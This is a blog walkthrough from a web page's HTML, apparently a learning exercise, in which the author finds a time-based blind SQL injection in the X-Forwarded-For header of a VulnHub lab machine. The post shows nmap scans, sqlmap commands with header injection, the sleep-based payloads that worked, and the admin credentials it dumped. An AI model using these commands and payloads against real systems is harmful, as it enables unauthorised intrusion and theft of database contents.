@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Marco Meli">
+  <meta name="description" content="From SQL Injection to Shell II | While practising on the blind SQL injections topic I came across this vulnhub lab which I have found particularly...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">
+
+  
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>
+
+  <link href="https://sittingducks.io/theme/css/colorbox.css" rel="stylesheet">
+
+  <link href="https://fonts.googleapis.com/css?family=Squada+One|Source+Code+Pro|Merriweather:300|Abril+Fatface" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+  <script src="/theme/tipuesearch/tipuesearch_set.js"></script>
+  <script src="/tipuesearch_content.js"></script>
+  <link rel="stylesheet" href="/theme/tipuesearch/tipuesearch.css">
+  <script src="/theme/tipuesearch/tipuesearch.js"></script>
+ 
+
+
+<meta name="keywords" content="VulnHub">
+
+
+  <title>From SQL Injection to Shell II</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-156989597-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation"> 
+	  
+		<form id="searchform" action="/search" onsubmit="return (this.elements['q'].value.length > 0)">
+		<input id="searchbox" type="text" name="q" size="12" placeholder="Search">
+		</form>
+		
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="htts://sittingducks.io" >home
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+                <a href="https://twitter.com/M4rC0ff" title="Twitter" >
+<i class="fa fa-twitter fa-lg"></i></a>
+                <a href="https://github.com/M4rc0ff" title="github" >
+<i class="fa fa-github fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+      <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="../images/logo.png" class="attachment-full size-full" alt="logo">          </a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
+                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (32)</a> &#124; 
+                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
+                <a href="https://sittingducks.io/archives.html" >Archives (34)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2019-05-25 09:00:00+01:00">Sat 25 May 2019</time></span>
+        <h1 class="entry-title"><a href="https://sittingducks.io/From-SQL-Injection-to-Shell-II.html">From SQL Injection to Shell II</a></h1>
+      </header><!-- .entry-header -->
+      <div class="fb-like" data-href="https://sittingducks.io/From-SQL-Injection-to-Shell-II.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
+      <div class="entry-content">
+        <p>While practising on the blind SQL injections topic I came across  <a href="https://www.vulnhub.com/entry/pentester-lab-from-sql-injection-to-shell-ii,69/">this vulnhub lab</a> which I have found particularly interesting. The lab was created in 2013 but it is still very relevant for learning and testing your skills. As explained in the description, there are two main objectives for this lab:</p>
+<ol>
+<li>gaining administrative access to the victim machine </li>
+<li>obtaining a remote shell to for code execution</li>
+</ol>
+<p>Since there are already three good walkthrough <a href="https://www.vulnhub.com/entry/pentester-lab-from-sql-injection-to-shell-ii,69/#walkthrough">articles</a> that cover this topic I am only going to focus on the the first objective with the aim to provide a different approach. Blind SQL injections are not easy to spot, therefore my aim is to facilitate and speed up the identification process avoiding manual steps. The other articles and especially <a href="https://pentesterlab.com/exercises/from_sqli_to_shell_II/course">this one</a> provides a more comprehensive approach which digs deeper and uses more manual steps. I strongly suggest to have a read if you want to understand the mechanism behind this blind SQL injection.  As the second objective has already been covered in the other articles and I want to avoid being redundant I will skip it.</p>
+<h3 id="walkthrough">Walkthrough</h3>
+<p>After downloading and deploying the ISO of the VM, we need to find out the IP address of our victim machine . From my attacker host (I am using <a href="https://www.parrotsec.org/">Parrot OS</a>), knowing i am in the 192.168.4.1-254 range, I launch a ping sweep as follow:</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[root@SittingDucks]─[~]</span>
+<span class="go">└──╼ #nmap -sn 192.168.4.1-254</span>
+<span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-25 21:42 BST</span>
+<span class="go">Nmap scan report for 192.168.4.1</span>
+<span class="go">Host is up (0.00073s latency).</span>
+<span class="go">MAC Address: 00:50:56:C0:00:08 (VMware)</span>
+<span class="go">Nmap scan report for 192.168.4.2</span>
+<span class="go">Host is up (0.00025s latency).</span>
+<span class="go">MAC Address: 00:50:56:E8:17:CC (VMware)</span>
+<span class="go">Nmap scan report for 192.168.4.129</span>
+<span class="go">Host is up (0.0013s latency).</span>
+<span class="go">MAC Address: 00:0C:29:EE:D8:8B (VMware)</span>
+<span class="go">Nmap scan report for 192.168.4.254</span>
+<span class="go">Host is up (0.00037s latency).</span>
+<span class="go">MAC Address: 00:50:56:E2:6E:46 (VMware)</span>
+<span class="go">Nmap scan report for 192.168.4.130</span>
+<span class="go">Host is up.</span>
+<span class="go">Nmap done: 254 IP addresses (5 hosts up) scanned in 2.43 seconds</span>
+</pre></div>
+
+
+<p>I notice a new IP address, 192.168.4.129, which is my new victim machine so now I launch a targeted scan to gather more information.</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[root@SittingDucks]─[~]</span>
+<span class="go">└──╼ #nmap -A 192.168.4.129</span>
+<span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-25 21:46 BST</span>
+<span class="go">Nmap scan report for 192.168.4.129</span>
+<span class="go">Host is up (0.0012s latency).</span>
+<span class="go">Not shown: 999 closed ports</span>
+<span class="go">PORT   STATE SERVICE VERSION</span>
+<span class="go">80/tcp open  http    nginx 0.7.67</span>
+<span class="go">|_http-server-header: nginx/0.7.67</span>
+<span class="go">|_http-title: My Photoblog - latest picture</span>
+<span class="go">MAC Address: 00:0C:29:EE:D8:8B (VMware)</span>
+<span class="go">Device type: general purpose</span>
+<span class="go">Running: Linux 2.6.X</span>
+<span class="go">OS CPE: cpe:/o:linux:linux_kernel:2.6.32</span>
+<span class="go">OS details: Linux 2.6.32</span>
+<span class="go">Network Distance: 1 hop</span>
+
+<span class="go">TRACEROUTE</span>
+<span class="go">HOP RTT     ADDRESS</span>
+<span class="go">1   1.25 ms 192.168.4.129</span>
+
+<span class="go">OS and Service detection performed. Please report any incorcd rect results at https://nmap.org/submit/ .</span>
+<span class="go">Nmap done: 1 IP address (1 host up) scanned in 8.47 seconds</span>
+</pre></div>
+
+
+<p>From the output I learn that the there is an nginx 0.7.67 webserver running on the default port 80 on the victim machine and that the website title is "My Photoblog".</p>
+<p><img alt="" src="../images/photoblog.png"></p>
+<p>I decide to explore the website and I move to the "test" page:</p>
+<p><img alt="" src="../images/photoblog_test.png"></p>
+<p>I notice that the URL changes to <strong>http://192.168.4.129/cat.php?id=1</strong> so I deduct I am dealing with a php web application and we can immediately test the id parameter to check if it is injectable. Simply adding the apostrophe symbol at the end of the URL <strong>http://192.168.4.129/cat.php?id=1'</strong> does not produce any results, meaning the parameter has been sanitised and is not injectable. </p>
+<p><a href="http://sqlmap.org/">Sqlmap</a> is a great tool which we can use it to scan websites for SQL injections. I have tried to scan the website in question with sqlmap but I was unsuccessful:</p>
+<div class="highlight"><pre><span></span><span class="go">[root@SittingDucks]─[~]</span>
+<span class="go">└──╼ #sqlmap -u http://192.168.4.129/ --batch --crawl=10</span>
+</pre></div>
+
+
+<p>but I got this result:</p>
+<div class="highlight"><pre><span></span><span class="go">[20:31:19] [CRITICAL] all tested parameters do not appear to be injectable. Try to</span>
+<span class="go">increase values for &#39;--level&#39;/&#39;--risk&#39; options if you wish to perform more tests. </span>
+<span class="go">If you suspect that there is some kind of protection mechanism involved (e.g. WAF)</span>
+<span class="go">maybe you could try to use option &#39;--tamper&#39; (e.g. &#39;--tamper=space2comment&#39;)</span>
+</pre></div>
+
+
+<p>then I increased the values for '--level'/'--risk' options:</p>
+<div class="highlight"><pre><span></span><span class="go">[root@SittingDucks]─[~]</span>
+<span class="go">└──╼ #sqlmap -u http://192.168.4.129/ --batch --crawl=10 --level=5 --risk=3</span>
+</pre></div>
+
+
+<p>and I got this:</p>
+<div class="highlight"><pre><span></span><span class="go">[22:37:38] [ERROR] all tested parameters do not appear to be injectable. If you suspect</span>
+<span class="go">that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try</span>
+<span class="go">to use option &#39;--tamper&#39; (e.g. &#39;--tamper=space2comment&#39;), skipping to the next form</span>
+</pre></div>
+
+
+<p>so I even added several tamper scripts with same results. At that point I stopped and I decided to go back doing more research. </p>
+<p>This is what I found from <a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap github page</a>:</p>
+<p><em>"By default sqlmap tests all GET parameters and POST parameters. When the value of --level is &gt;= 2 it tests also HTTP Cookie header values. When this value is &gt;= 3 it tests also HTTP User-Agent and HTTP Referer header value for SQL injections. It is however possible to manually specify a comma-separated list of parameter(s) that you want sqlmap to test. This will bypass the dependence on value of --level too."</em></p>
+<p>and also this regarding extra HTTP Headers:</p>
+<p><em>"It is possible to provide extra HTTP headers by setting the option --headers."</em></p>
+<p>So what if the blind vulnerability is hidden behind an extra (non-standard) HTTP header that sqlmap does not scan by default? And if this is the case, how can I know which one is the header in question given that there are so <a href="https://en.wikipedia.org/wiki/List_of_HTTP_header_fields">many</a> out there?</p>
+<p>After some other research I found another interesting tool, <a href="https://github.com/JohnTroony/Blisqy">Blisqy</a>. So I decided to give it a try.</p>
+<p>I downloaded the tool which consists of python scripts:</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[m4rc0@SittingDucks]─[~/MyTools/Blisqy]</span>
+<span class="go">└──╼ $ll</span>
+<span class="go">total 16K</span>
+<span class="go">-rwxr-xr-x 1 root root  683 May 25 15:55 ExploitBlindSpot.py</span>
+<span class="go">-rwxr-xr-x 1 root root  800 May 25 15:58 FindBlindSpot.py</span>
+<span class="go">drwxr-xr-x 1 root root   30 May 25 15:55 fuzz-data</span>
+<span class="go">drwxr-xr-x 1 root root  106 May 25 15:59 fuzz-reports</span>
+<span class="go">drwxr-xr-x 1 root root  134 May 25 20:07 lib</span>
+<span class="go">-rw-r--r-- 1 root root 7.6K May 25 15:55 README.md</span>
+</pre></div>
+
+
+<p>To make it work, all I had to do is edit the the FindBlindSpot.py and add my target details:</p>
+<div class="highlight"><pre><span></span><span class="gp">#</span> Target Parameters
+<span class="go">Server = &#39;192.168.4.129&#39;</span>
+<span class="go">Port = 80</span>
+<span class="go">Index = 1</span>
+<span class="go">Method = &#39;GET&#39;</span>
+</pre></div>
+
+
+<p>After running the script I get this result:</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[root@SittingDucks]─[/home/m4rc0/MyTools/Blisqy]</span>
+<span class="go">└──╼ #./FindBlindSpot.py </span>
+<span class="go">[+] Fuzzer Running  : 192.168.4.129:80</span>
+
+<span class="go">[+] Base Index Record for Target : 0.0</span>
+
+<span class="go">============== Furzzzn ===============</span>
+
+<span class="go">&lt;snip&gt;</span>
+
+<span class="go">==============[ LUCKY! ]=====================</span>
+<span class="go">[!] Found some +ve Results Check Fuzz Report for Details</span>
+
+<span class="go">[+] Injection : X-Forwarded-For : &#39;XOR(if(now()=sysdate(),sleep(5),0))OR&#39;</span>
+
+<span class="go">[+] Header : X-Forwarded-For</span>
+
+<span class="go">[*] Index Record : 0.000646114349365</span>
+<span class="go">[*] Benching Record : 5.00064611435</span>
+<span class="go">[*] Fuzzing Record : 10.01</span>
+<span class="go">[!] Test 469 is Injectable.</span>
+
+<span class="go">------</span>
+
+<span class="go">[+] Injection : X-Forwarded-For : &#39; or sleep(5)#</span>
+
+<span class="go">[+] Header : X-Forwarded-For</span>
+
+<span class="go">[*] Index Record : 0.00129318237305</span>
+<span class="go">[*] Benching Record : 5.00129318237</span>
+<span class="go">[*] Fuzzing Record : 25.01</span>
+<span class="go">[!] Test 473 is Injectable.</span>
+
+<span class="go">------</span>
+
+<span class="go">[+] Injection : X-Forwarded-For : &#39; or sleep(5)=&#39;</span>
+
+<span class="go">[+] Header : X-Forwarded-For</span>
+
+<span class="go">[*] Index Record : 0.00204205513</span>
+<span class="go">[*] Benching Record : 5.00204205513</span>
+<span class="go">[*] Fuzzing Record : 60.01</span>
+<span class="go">[!] Test 475 is Injectable.</span>
+
+<span class="go">&lt;snip&gt;</span>
+</pre></div>
+
+
+<p>As suspected, a non-standard header was found vulnerable to SQL injection. The header in question is   <a href="https://en.wikipedia.org/wiki/X-Forwarded-For">X-Forwarded-For</a>, which is typically used for identifying the originating IP address of a client that connects to a web server through a proxy. With this knowledge I can now go back to sqlmap and perform a targeted scan using the X-Forwarded-For header as follow:</p>
+<div class="highlight"><pre><span></span><span class="go">[root@SittingDucks]─[~]</span>
+<span class="go">└──╼ #sqlmap -u http://192.168.4.129/ --batch --headers=&quot;X-Forwarded-For:*&quot;</span>
+
+<span class="go">.....</span>
+
+<span class="gp">[10:49:55] [INFO] (custom) HEADER parameter &#39;X-Forwarded-For #</span><span class="m">1</span>*<span class="s1">&#39; appears to be &#39;</span>MySQL &gt;<span class="o">=</span> <span class="m">5</span>.0.12 AND time-based blind<span class="err">&#39;</span> injectable
+
+<span class="go">.....</span>
+
+<span class="go">sqlmap identified the following injection point(s) with a total of 62 HTTP(s) requests:</span>
+
+<span class="go">Parameter: X-Forwarded-For #1* ((custom) HEADER)</span>
+<span class="go">    Type: time-based blind</span>
+<span class="go">    Title: MySQL &gt;= 5.0.12 AND time-based blind</span>
+<span class="go">    Payload: &#39; AND SLEEP(5) AND &#39;sYsD&#39;=&#39;sYsD</span>
+
+<span class="go">[10:50:11] [INFO] the back-end DBMS is MySQL</span>
+<span class="go">web application technology: PHP 5.3.3, Nginx 0.7.67</span>
+<span class="go">back-end DBMS: MySQL &gt;= 5.0.12</span>
+<span class="go">[10:50:11] [INFO] fetching database names</span>
+<span class="go">[10:50:11] [INFO] fetching number of databases</span>
+<span class="go">[10:50:11] [INFO] resumed: 2</span>
+<span class="go">[10:50:11] [INFO] resumed: information_schema</span>
+<span class="go">[10:50:11] [INFO] resumed: photoblog</span>
+<span class="go">available databases [2]:</span>
+<span class="go">[*] information_schema</span>
+<span class="go">[*] photoblog</span>
+
+<span class="go">[10:50:11] [INFO] fetched data logged to text files under &#39;/root/.sqlmap/output/192.168.4.129&#39;</span>
+
+<span class="go">[*] ending @ 10:50:11 /2019-05-27/</span>
+</pre></div>
+
+
+<p>Since the name of the website is "My Awesome Photoblog" I can easily guess that the name of the database is <strong>photoblog</strong> and therefore I will dump all its content using the following command:</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[root@SittingDucks]─[~]</span>
+<span class="go">└──╼ #sqlmap -u http://192.168.4.129 --headers=&quot;X-Forwarded-For:*&quot; -D photoblog --dump-all --batch</span>
+</pre></div>
+
+
+<p>This is an excerpt of the result which contains very valuable information:</p>
+<div class="highlight"><pre><span></span><span class="go">Database: photoblog                                                            </span>
+<span class="go">Table: users</span>
+<span class="go">[1 entry]</span>
+<span class="go">+----+-------+---------------------------------------------+</span>
+<span class="go">| id | login | password                                    |</span>
+<span class="go">+----+-------+---------------------------------------------+</span>
+<span class="go">| 1  | admin | 8efe310f9ab3efeae8d410a8e0166eb2 (P4ssw0rd) |</span>
+<span class="go">+----+-------+---------------------------------------------+</span>
+</pre></div>
+
+
+<p>The photoblog database contains, indeed, a table "users" with a login user name called "admin" and a password "P4ssw0rd".</p>
+<p>Looking back at the website there is an administration login page:</p>
+<p><img alt="" src="../images/photoblog_admin.png"></p>
+<p>and if i try to login using the credentials mentioned above I succeed:</p>
+<p><img alt="" src="../images/photoblog_login.png"></p>
+<p>I have now gained administrative access to the website which was part of the objectives of this exercise.</p>
+<p>As mentioned above please refer to one of these articles for the second objective:</p>
+<ul>
+<li>16 Jan 2017 - <a href="http://www.hackingarticles.in/hack-pentester-lab-sql-injection-shell-ii-blind-sql-injection/">Hack the Pentester Lab: from SQL injection to Shell II (Blind SQL Injection)</a> (<a href="https://www.vulnhub.com/author/raj-chandel,364/">Raj Chandel</a>)</li>
+<li>19 Nov 2016 - <a href="https://zerodayguys.blogspot.co.uk/2016/11/from-sql-injection-to-shell-2walkthough.html">From SQL Injection to Shell 2:Walkthough</a> (<a href="https://www.vulnhub.com/author/rakesh-singh,402/">Rakesh Singh</a>)</li>
+<li>12 Jun 2013 - <a href="https://pentesterlab.com/exercises/from_sqli_to_shell_II/course">From SQL injection to Shell II</a> (<a href="https://www.vulnhub.com/author/pentester-lab,69/">Pentester Lab</a>)</li>
+</ul>
+			<style>
+#pcs-comment-form input,
+#pcs-comment-form textarea {
+	width: 100%;
+}
+#pcs-comment-form-display-replyto {
+	border: solid 1px black;
+	padding: 2px;
+}
+#pcs-comment-form-display-replyto p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+#pcs-comments ul {
+	list-style: none;
+}
+#pcs-comments .comment-left {
+	display: table-cell;
+	padding-right: 10px;
+}
+#pcs-comments .comment-body {
+	display: table-cell;
+	vertical-align: top;
+	width: 100%;
+}
+</style>
+
+	<section id="pcs-comments">
+	<header>
+		<h2>Comments</h2>
+		<hr/>
+	</header>
+		<p>There are no comments yet.</p>
+	<section>
+	<form id="pcs-comment-form" action="#">
+		<legend>Add a Comment</legend>
+		<input type="hidden" id="pcs-comment-form-input-replyto">
+		<fieldset>
+			<label for="pcs-comment-form-input-name">Name</label>
+			<input  id="pcs-comment-form-input-name" type="text" placeholder="Enter your name or nickname" />
+		</fieldset>
+		<fieldset>
+			<label for="pcs-comment-form-input-website">Website</label>
+			<input  id="pcs-comment-form-input-website" type="text" placeholder="Enter your website (optional)" />
+		</fieldset>
+		<fieldset>
+			<label   for="pcs-comment-form-input-textarea">Your Comment</label>
+			<textarea id="pcs-comment-form-input-textarea" rows="5" style="resize:vertical;" placeholder="Your comment"></textarea>
+			<p>You can use the <a href="https://en.wikipedia.org/wiki/Markdown">Markdown</a> syntax to format your comment.</p>
+			<div style="display: none; " id="pcs-comment-form-display-replyto"></div>
+		</fieldset>
+
+		<button type="submit"
+				id="pcs-comment-form-button-submit"
+				>Post via email</button>
+
+			<a href="https://sittingducks.io/feeds/comment.From-SQL-Injection-to-Shell-II.atom.xml">
+				Comment Atom Feed
+			</a>
+	</form>
+</section>
+
+</section>
+
+			<script type="text/javascript" src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+	<script type="text/javascript" src="https://sittingducks.io/theme/js/comments.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			CommentSystem.email_user   = "sittingducks.io";
+			CommentSystem.email_domain = "protonmail.com";
+			CommentSystem.display_replyto_html = function(comment_content, article_slug, author) { 
+				return ''
+					+ '<button style="float:right;" onclick="CommentSystem.cancelReply(); return false;" title="Cancel the reply">'
+					+ 	'×'
+					+ '</button>'
+					+ '<p>This comment will be posted as a reply to \'<a title="'+comment_content+'" href="#comment-'+article_slug+'">'+author+'</a>\'</p>';
+			};
+
+			$('#pcs-comment-form').on("submit",
+				function( event )
+				{
+					event.preventDefault();
+					$(location).attr('href', CommentSystem.getMailtoLink("From-SQL-Injection-to-Shell-II"));
+				}
+			);
+		});
+	</script>
+
+
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="https://sittingducks.io/tag/vulnhub.html">VulnHub</a>      </div>
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+
+
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
+                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />
+                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+  
+ <!-- <script src="https://sittingducks.io/theme/js/jquery.min.js"></script> -->
+	<!-- Make sure jquery is loaded first, then load colorbox -->
+  <script src="https://sittingducks.io/theme/js/jquery.colorbox-min.js"></script>
+  <script src="https://sittingducks.io/theme/js/load-colorbox.js"></script>
+
+
+  
+  
+</body>
+</html>
